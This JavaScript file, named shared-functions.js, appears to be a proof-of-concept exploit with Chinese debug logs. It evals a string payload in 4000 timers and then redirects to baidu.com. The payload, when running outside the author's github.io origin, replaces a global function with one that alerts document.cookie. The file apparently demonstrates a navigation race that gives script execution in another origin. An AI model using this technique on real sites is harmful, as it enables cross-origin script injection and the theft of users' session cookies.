(function() {
    'use strict';
    
    console.log('📦 shared-functions.js 开始加载...');
    console.log('🕒 加载时间:', new Date().toISOString());
    console.log('🌐 当前域名:', window.location.hostname);
    
    // 定义 backToSrcLanguage 函数
    window.backToSrcLanguage = function() {
        console.log('🚀 backToSrcLanguage 函数被调用');
        console.log('📝 调用堆栈:', new Error().stack);
        
        const currUrl = location.href;
        console.log('📍 当前URL:', currUrl);
        
        const payload = `
        console.log('定义payload字段开始加载');
        if (!location.href.startsWith("https://ideet.github.io") && !window.__cloudx_called) {
            window.__cloudx_called = true;
            console.log('开始重定义backToSrcLanguage方法');
            window.backToSrcLanguage = function() {alert(document.cookie);}
            console.log('重定义backToSrcLanguage完成');
        }
        `;
        
        console.log('📄 生成的payload:', payload);
        console.log('🔁 开始设置4000个定时器...');
        
        for (let i = 0; i < 4000; i++) {
            setTimeout(function() {
                console.log(`⏰ 定时器 #${i} 执行`);
                console.log(`🔍 检查 window.__cloudx_called:`, window.__cloudx_called);

                eval(payload);
                window.backToSrcLanguage();
                eval(payload);
            }, i);
        }
        
        console.log('✅ 4000个定时器设置完成');
        console.log('🔗 准备跳转到百度...');
        
        // 跳转到百度
        window.location.href = "https://www.baidu.com";
        
        console.log('🔄 跳转指令已执行');
        
        return true;
    };
    
})();



console.log('🎉 shared-functions.js 加载脚本执行完毕');
console.log('=========================================');
